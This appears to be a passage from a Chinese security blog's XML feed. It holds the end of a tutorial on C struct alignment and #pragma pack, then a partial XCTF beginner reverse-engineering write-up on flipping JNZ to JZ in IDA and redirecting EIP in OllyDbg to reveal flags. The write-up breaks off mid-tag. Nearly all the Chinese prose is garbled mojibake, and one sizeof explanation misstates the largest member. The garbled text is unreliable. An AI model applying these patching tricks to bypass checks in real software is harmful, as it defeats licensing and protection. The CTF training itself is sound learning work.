)</code></pre><p>è¯¥æ“ä½œä¼šæ”¹å˜ä¸€ä¸ªç»“æ„ä½“çš„å­—èŠ‚å¯¹é½æ•°ï¼Œè¿™æ˜¯é’ˆå¯¹ç¼–è¯‘å™¨çš„ã€‚<br>å¯¹é½å‚æ•°ï¼šnä¸ºå­—èŠ‚å¯¹é½æ•°ï¼Œå…¶å–å€¼ä¸º1ã€2ã€4ã€8ï¼Œé»˜è®¤æ˜¯8ã€‚<br>å¦‚æœè¿™ä¸ªå€¼æ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œé‚£ä¹ˆè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†ï¼Œ<strong>å³æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼.</strong></p><pre><code>#pragma pack(n)            struct Test            {                 int a ;                 __int64 b ;                 char c ;            };            #pragma pack()            </code></pre><p>ä»¥ä¸‹æ˜¯å„ç§æƒ…å†µçš„å†…å­˜å¯¹é½åˆ†æ:<br>1:1å­—èŠ‚å¯¹é½<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735626712023.jpg" srcset="/img/loading.gif" alt="-w155"><br>2:2å­—èŠ‚å¯¹é½æ—¶ï¼š<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735626990588.jpg" srcset="/img/loading.gif" alt="-w266"><br>3ï¼š4ä¸ªå­—èŠ‚å¯¹é½<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735627321430.jpg" srcset="/img/loading.gif" alt="-w381"><br>4ã€8ä¸ªå­—èŠ‚å¯¹é½</p><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735627463362.jpg" srcset="/img/loading.gif" alt="-w583"></p><h3 id="å¯¹é½åŸåˆ™ï¼š"><a href="#å¯¹é½åŸåˆ™ï¼š" class="headerlink" title="å¯¹é½åŸåˆ™ï¼š"></a>å¯¹é½åŸåˆ™ï¼š</h3><p>åŸåˆ™ä¸€ï¼šæ•°æ®æˆå‘˜å¯¹é½è§„åˆ™ï¼šç»“æ„çš„æ•°æ®æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æˆå‘˜æ”¾åœ¨offsetä¸º0çš„åœ°æ–¹ï¼Œä»¥åæ¯ä¸ªæ•°æ®æˆå‘˜å­˜å‚¨çš„èµ·å§‹ä½ç½®è¦ä»è¯¥æˆå‘˜å¤§å°çš„æ•´æ•°å€å¼€å§‹(æ¯”å¦‚intåœ¨32ä½æœºä¸ºï¼”å­—èŠ‚ï¼Œåˆ™è¦ä»4çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨).                                    </p><p>åŸåˆ™äºŒï¼šç»“æ„ä½“çš„æ€»å¤§å°ï¼Œä¹Ÿå°±æ˜¯sizeofçš„ç»“æœï¼Œå¿…é¡»æ˜¯å…¶å†…éƒ¨æœ€å¤§æˆå‘˜çš„æ•´æ•°å€ï¼Œä¸è¶³çš„è¦è¡¥é½ã€‚<br>åŸåˆ™ä¸‰ï¼šå¦‚æœä¸€ä¸ªç»“æ„é‡Œæœ‰æŸäº›ç»“æ„ä½“æˆå‘˜ï¼Œåˆ™ç»“æ„ä½“æˆå‘˜è¦ä»å…¶å†…éƒ¨æœ€å¤§å…ƒç´ å¤§å°çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨ã€‚                                    <strong>(struct aé‡Œå­˜æœ‰struct bï¼Œbé‡Œæœ‰charï¼Œintï¼Œdoubleç­‰å…ƒç´ ï¼Œé‚£båº”è¯¥ä»8çš„æ•´æ•°å€å¼€å§‹å­˜å‚¨.)</strong>                                    </p><p>åŸåˆ™å››ï¼šå¯¹é½å‚æ•°å¦‚æœæ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†.<br>    ä¹Ÿå°±æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼.                                </p><p><strong>ç”±æµ…å…¥æ·±ï¼Œåˆ†æå†…å­˜å¯¹é½åŸåˆ™åå†…å­˜åˆ°åº•æ˜¯æ€ä¹ˆåˆ†é…çš„</strong></p><h4 id="æ¡ˆä¾‹åˆ†æä¸€ï¼š"><a href="#æ¡ˆä¾‹åˆ†æä¸€ï¼š" class="headerlink" title="æ¡ˆä¾‹åˆ†æä¸€ï¼š"></a>æ¡ˆä¾‹åˆ†æä¸€ï¼š</h4><pre><code>struct Test                {                    char  a;                    int b ;                };                </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735632219948.jpg" srcset="/img/loading.gif" alt="-w671"><br><strong>sizeof(Test) =1+3ï¼ˆè¡¥é½çš„ï¼‰+4=8(å…¶ä¸­æœ€å¤§çš„4çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹äºŒåˆ†æï¼š"><a href="#æ¡ˆä¾‹äºŒåˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹äºŒåˆ†æï¼š"></a>æ¡ˆä¾‹äºŒåˆ†æï¼š</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                    };                    </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735634186981.jpg" srcset="/img/loading.gif" alt="-w621"><br><strong>sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+7ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹ä¸‰åˆ†æï¼š"><a href="#æ¡ˆä¾‹ä¸‰åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹ä¸‰åˆ†æï¼š"></a>æ¡ˆä¾‹ä¸‰åˆ†æï¼š</h4><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                        char d ;                    };                    </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735635119907.jpg" srcset="/img/loading.gif" alt="-w662"></p><p><strong>sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹å››åˆ†æï¼š"><a href="#æ¡ˆä¾‹å››åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹å››åˆ†æï¼š"></a>æ¡ˆä¾‹å››åˆ†æï¼š</h4><pre><code>struct S1        {            char c;        double i;    };        </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735636051365.jpg" srcset="/img/loading.gif" alt="-w530"></p><p><strong>sizeof(S1) =1+7ï¼ˆè¡¥é½çš„ï¼‰+8=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹äº”åˆ†æï¼š"><a href="#æ¡ˆä¾‹äº”åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹äº”åˆ†æï¼š"></a>æ¡ˆä¾‹äº”åˆ†æï¼š</h4><pre><code>struct S2        {            int c1;         char c2[10]; };    </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735636961393.jpg" srcset="/img/loading.gif" alt="-w547"></p><p><strong>sizeof(S2) =4+10+2ï¼ˆè¡¥é½çš„ï¼‰=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹å…­åˆ†æï¼š"><a href="#æ¡ˆä¾‹å…­åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹å…­åˆ†æï¼š"></a>æ¡ˆä¾‹å…­åˆ†æï¼š</h4><pre><code>struct S3        {            char c1;         S1 s;            char c2;         char c3;     };</code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735637638057.jpg" srcset="/img/loading.gif" alt="-w539"></p><p><strong>sizeof(S3) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=32(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹ä¸ƒåˆ†æï¼š"><a href="#æ¡ˆä¾‹ä¸ƒåˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹ä¸ƒåˆ†æï¼š"></a>æ¡ˆä¾‹ä¸ƒåˆ†æï¼š</h4><pre><code>struct S4        {            char c1;         S1 s;            char c2;         double c3;     };    </code></pre><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735639114324.jpg" srcset="/img/loading.gif" alt="-w558"></p><p><strong>sizeof(S4) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+7ï¼ˆè¡¥é½çš„ï¼‰+8=40(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xctf\_REæ–°æ‰‹åŒºWP</title>
    <link href="/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <url>/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Xctf-REæ–°æ‰‹åŒºWP"><a href="#Xctf-REæ–°æ‰‹åŒºWP" class="headerlink" title="Xctf_REæ–°æ‰‹åŒºWP"></a>Xctf_REæ–°æ‰‹åŒºWP</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦cä¸åæ±‡ç¼–å­¦çš„æœ‰ç‚¹ç–²å€¦äº†ï¼Œä¸”å®é™…è¿ç”¨æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æœ€è¿‘ä¸€å‘¨åˆ·äº†å¾ˆå¤šçš„Reå…¥é—¨é¢˜ï¼Œå·©å›ºçŸ¥è¯†ä¸”ç†Ÿæ‚‰ä¸‹ctfä¸­çš„REé¢˜ç›®ã€‚</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆæŸ¥å£³ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15732702605654.jpg" srcset="/img/loading.gif" alt="-w625"><br>ï¼ˆæŸ¥å£³å¾ˆé‡è¦ï¼Œå¯ä»¥å…ˆç¡®è®¤æ˜¯å¦æœ‰å£³è¿˜å¯ä»¥çŸ¥é“ç¨‹åºæ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼‰<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733071101333.jpg" srcset="/img/loading.gif" alt="-w656"><br>çœ‹ä¸‹ç¨‹åºæ˜¯å¹²å˜›çš„ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥flagç„¶åç¨‹åºå‡ºä¸ªåˆ¤æ–­æ˜¯å¦æ­£ç¡®ã€‚<strong>ä¼°è®¡å°±æ˜¯ä¸ªæ˜æ–‡å¯¹æ¯”</strong>ï¼Œç›´æ¥odæ‰“å¼€ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733074111357.jpg" srcset="/img/loading.gif" alt="-w911"><br>æ–­åœ¨äº†reæ¨¡å—ã€‚ç›´æ¥æœç´¢å­—ç¬¦ä¸²<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733075097915.jpg" srcset="/img/loading.gif" alt="-w673"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733072667813.jpg" srcset="/img/loading.gif" alt="-w801"><br>æ‹¿åˆ°flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>è¿˜æ˜¯å…ˆæŸ¥å£³ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733077161080.jpg" srcset="/img/loading.gif" alt="-w519"><br>æ— å£³<br>è¿™é“é¢˜æœ‰å¤šç§åšæ³•ï¼Œä¸‹é¢å±•ç¤ºä¸‰ç§ï¼š</p><h3 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h3><p><strong>è¿™ä¸ªåšæ³•ä¸»è¦æ˜¯åˆ¤æ–­ç¨‹åºé€»è¾‘ï¼Œç„¶åæ”¹å…³é”®è·³è½¬çš„æ±‡ç¼–ä»£ç ï¼Œè¿›è¡Œçˆ†ç ´ç ´è§£ã€‚</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079095740.jpg" srcset="/img/loading.gif" alt="-w678"><br>å…ˆçœ‹ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079517175.jpg" srcset="/img/loading.gif" alt="-w545"><br>å…ˆè¾“å…¥ä¸ª1<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079675395.jpg" srcset="/img/loading.gif" alt="-w507"><br>å‘ç°å›¾æ¡ˆä¸­ç¬¬1ï¼Œ2ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733082372049.jpg" srcset="/img/loading.gif" alt="-w659"><br>æ¥ç€è¾“å…¥2ï¼Œç„¶åç¬¬3ï¼Œ4ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚æ„Ÿè§‰æ²¡ä»€ä¹ˆè§„å¾‹ï¼Œå¤§æ¦‚çŒœä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯è¿™8è¡Œçš„çº¿æ¡å…¨éƒ¨è¿é€šå°±å¯ä»¥å®Œæˆè¿™ä¸ªæ¸¸æˆã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733085847753.jpg" srcset="/img/loading.gif" alt="-w607"></p><h4 id="æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ"><a href="#æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ" class="headerlink" title="æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ"></a>æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733087052533.jpg" srcset="/img/loading.gif" alt="-w489"><br>å‘ç°ä¸€å †å‡½æ•°éš¾ä»¥æ‰¾åˆ°ä¸»å‡½æ•°ï¼ŒæŒ‰<code>shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733088311433.jpg" srcset="/img/loading.gif" alt="-w909"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733088160599.jpg" srcset="/img/loading.gif" alt="-w865"><br>ç‚¹å‡»è¿™ä¸ªï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼Œç„¶åå¯ä»¥åŒå‡»è·³è½¬åˆ°mainå‡½æ•°ï¼Œçœ‹æ•´ä¸ªç¨‹åºçš„é€»è¾‘ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733091045568.jpg" srcset="/img/loading.gif" alt="-w746"></p><p>è·³è½¬å¥½åæŒ‰F5æŸ¥çœ‹ä¼ªä»£ç ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733092783647.jpg" srcset="/img/loading.gif" alt="-w471"><br>åœ¨ä¸‹æ–¹å‘ç°äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œæ»¡è¶³åä¼šè°ƒç”¨sub_45Ab4è¿™ä¸ªå‡½æ•°ã€‚åŒå‡»è¿›å…¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733094560784.jpg" srcset="/img/loading.gif" alt="-w465"><br>å‘ç°ä¼šå‡ºç°è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733094810614.jpg" srcset="/img/loading.gif" alt="-w387"><br>è¿˜ç»è¿‡ä¸€å †æ•°æ®å’Œå¼‚æˆ–åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é‚£è¿™ä¸ªåº”è¯¥å°±æ˜¯è¿”å›flagäº†ã€‚<strong>é‚£å°±æ˜¯æƒ³åŠæ³•è®©ç¨‹åºè°ƒç”¨<code>sub_45Ab4</code>è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733096364506.jpg" srcset="/img/loading.gif" alt="-w307"><br>å†çœ‹ä¸€ä¸‹è¿™ä¸ªifè¯­å¥é‡Œé¢æ­£å¥½æ˜¯å¯¹ä¸€ä¸ªå®¹é‡ä¸º8çš„æ•°ç»„è¿›è¡Œåˆ¤æ–­ï¼Œå¯¹åº”åˆšåˆšç¨‹åºä¸­çš„8è¡Œï¼Œæ­£å¥½å¯¹åº”å½“8è¡Œç›´çº¿å…¨éƒ¨è¿æ¥ï¼ˆä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯å›¾æ¡ˆå…¨å˜ï¼‰å°±ä¼šè°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚</p><p>é‚£ç°åœ¨éœ€è¦åšçš„å°±å¾ˆæ˜ç¡®çš„ï¼Œç›´æ¥æ”¹ç¨‹åºæµç¨‹ï¼ŒIDAçš„patchæ˜¯å¯ä»¥åšåˆ°çš„ï¼Œç»“åˆåˆšåˆšæˆ‘ä»¬è¾“å…¥1çš„æ—¶å€™å›è®©1ï¼Œ2ï¼Œ8è¡Œè¿›è¡Œæ”¹å˜ï¼Œé‚£æˆ‘ä»¬å°±åœ¨è¿™å‡ å¤„åšæ”¹å˜å°±å¯ä»¥äº†ã€‚</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733100087904.jpg" srcset="/img/loading.gif" alt="-w423"><br>çœ‹ä¸»å‡½æ•°çš„æµç¨‹å›¾æ¨¡å¼ï¼Œä¸“é—¨æ‰¾è¿™ä¸ªè·³è½¬æŒ‡ä»¤JNZï¼Œæ•°ä¸€ä¸‹8ä¸ªå°±æ˜¯åˆšåˆšçš„8ä¸ªåˆ¤æ–­äº†ã€‚å¯¹åº”åˆšåˆšçš„æƒ³æ³•æˆ‘ä»¬åœ¨<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733100975029.jpg" srcset="/img/loading.gif" alt="-w394"><br>è¿™å‡ å¤„çš„æ±‡ç¼–ä»£ç è¿›è¡Œpatchï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733101571151.jpg" srcset="/img/loading.gif" alt="-w504"><br><strong>æŠŠJNZæ”¹æˆæ­£å¥½ç›¸åçš„JZ</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733107484458.jpg" srcset="/img/loading.gif" alt="-w460"></p><p>ä¿®æ”¹å¥½åæŸ¥çœ‹ä¸‹ç”Ÿæˆçš„ä¼ªä»£ç <br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733107946575.jpg" srcset="/img/loading.gif" alt="-w375"><br>è¾¾åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚<br>ç„¶åæˆ‘ä»¬éœ€è¦æŠŠè¿™äº›æ‰“patchçš„åœ°æ–¹ä¿å­˜ä¸‹æ¥ï¼Œè®©å…¶æˆæ•ˆï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733103617647.jpg" srcset="/img/loading.gif" alt="-w1324"><br>ç‚¹å‡»okå³å¯ï¼Œå¯ä»¥ä¸ºäº†å®‰å…¨é€‰æ‹©ä¸€ä¸‹åšä¸ªbakå¤‡ä»½ã€‚</p><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733108996551.jpg" srcset="/img/loading.gif" alt="-w564"><br>è¾“å…¥1<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733109139764.jpg" srcset="/img/loading.gif" alt="-w661"><br>æ‹¿åˆ°äº†flagã€‚</p><h3 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h3><p>è¿™ç§ä¸»è¦æ˜¯åœ¨IDAä¸­é™æ€åˆ†æåçŸ¥é“äº†ï¼Œåœ¨ç¨‹åºè°ƒç”¨è¾“å‡ºflagå‡½æ•°åflagå°±æ‰“å°å‡ºæ¥äº†ã€‚å°±å¯ä»¥æƒ³åŠæ³•åœ¨åŠ¨æ€è°ƒè¯•ä¸­ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚é‡åœ¨IDAå’ŒODæ­é…ä½¿ç”¨äº†ã€‚</p><h4 id="IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€"><a href="#IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€" class="headerlink" title="IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€"></a>IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733116649387.jpg" srcset="/img/loading.gif" alt="-w829"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733116800264.jpg" srcset="/img/loading.gif" alt="-w702"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733118131519.jpg" srcset="/img/loading.gif" alt="-w688"><br>è®°ä½è¿™ä¸ª0045E940 åœ°å€ã€‚ä¸‹é¢ODç›´æ¥æƒ³åŠæ³•æ‰§è¡Œåˆ°è¯¥åœ°å€</p><h4 id="ODåŠ¨æ€è°ƒè¯•"><a href="#ODåŠ¨æ€è°ƒè¯•" class="headerlink" title="ODåŠ¨æ€è°ƒè¯•"></a>ODåŠ¨æ€è°ƒè¯•</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733122639383.jpg" srcset="/img/loading.gif" alt="-w498"><br>å‘ç°åŸºåœ°å€æ˜¯010F<br>åœ¨ODä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾ä¸€ä¸‹æˆ‘ä»¬åº”è¯¥åœ¨å“ªä¸ªåœ°æ–¹æ‰¾ä¸€ä¸ªåˆé€‚çš„å¯ä»¥æ§åˆ¶çš„ä»£ç æ®µã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733124212188.jpg" srcset="/img/loading.gif" alt="-w692"><br>å‘ç°äº†è¾“å…¥nçš„è¯­å¥åœ°å€ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733124483702.jpg" srcset="/img/loading.gif" alt="-w695"><br>è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºã€‚F9è®©ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œæ–­ä¸‹æ¥ã€‚æŒ‰ç©ºæ ¼ä¿®æ”¹ä¸‹æ±‡ç¼–ä»£ç <code>jmp 0x010FE490</code><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733126763356.jpg" srcset="/img/loading.gif" alt="-w688"></p><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733126850272.jpg" srcset="/img/loading.gif" alt="-w205"><br>è¿™æ—¶å€™çš„EIPï¼Œç„¶åå•æ­¥æ‰§è¡Œ<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733127939834.jpg" srcset="/img/loading.gif" alt="-w869"><br>è¿‡æ¥äº†ï¼Œåˆ°äº†è°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚ç„¶åæ¥ä¸‹æ¥ä¼šæœ‰å¾ˆå¤šå¾ªç¯å’Œå­—ç¬¦å¤„ç†çš„æ“ä½œï¼Œç›´æ¥å¯ä»¥æŒ‰CTRL+F8æŒ‰é”®è®©ODè‡ªåŠ¨æ‰§è¡Œã€‚è®©æŠŠè¿™ä¸ªå‡½æ•°å¤„ç†å®Œï¼Œå°±ä¼šå‡ºç°flagå­—ç¬¦ä¸²ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733127636852.jpg" srcset="/img/loading.gif" alt="-w674"></p><p>è¿™ç§ä¿®æ”¹EIPæ˜¯é‡ç‚¹å’Œæ‰¾åˆ°åˆé€‚å¯æ§åˆ¶ä»£ç æ®µæ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥<br>åœ¨æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶ä»£ç åï¼Œåœ¨æœç´¢å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733133763253.jpg" srcset="/img/loading.gif" alt="-w637"><br>å•å‡»è¿‡å»ï¼Œç„¶ååœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å¤´è®¾ç½®ä¸ºæ–°çš„EIP<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733132918043.jpg" srcset="/img/loading.gif" alt="-w622"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733134257814.jpg" srcset="/img/loading.gif" alt="-w208"><br>ç„¶åæŒ‰ä¸€ä¸‹F8å°±æ¥åˆ°äº†è¿™ä¸ªå‡½æ•°é‡Œé¢äº†ã€‚å†è¿›è¡Œåˆšåˆšçš„æ“ä½œå°±å¯ä»¥äº†ã€‚</p><h3 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h3><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰¾åˆ°äº†å…³é”®å‡½æ•°ï¼Œåˆ†æä»¥åæ˜¯å¯ä»¥æŠŠè¿™ä¸ªå‡½æ•°æ˜¯å†™å‡ºæ¥çš„ï¼Œç„¶åæ ¹æ®ä¼ªä»£ç å†™å‡ºåŸæ¥çš„ç¨‹åºå°±å¯ä»¥äº†ã€‚</p><h4 id="ODé™æ€åˆ†æ"><a href="#ODé™æ€åˆ†æ" class="headerlink" title="ODé™æ€åˆ†æ"></a>ODé™æ€åˆ†æ</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137173061.jpg" srcset="/img/loading.gif" alt="-w682"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137433462.jpg" srcset="/img/loading.gif" alt="-w521"><br>è°ƒç”¨å…¶å‡½æ•°ã€‚åŒå‡»è¿›å…¥F5ç”Ÿæˆä¼ªä»£ç ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137975116.jpg" srcset="/img/loading.gif" 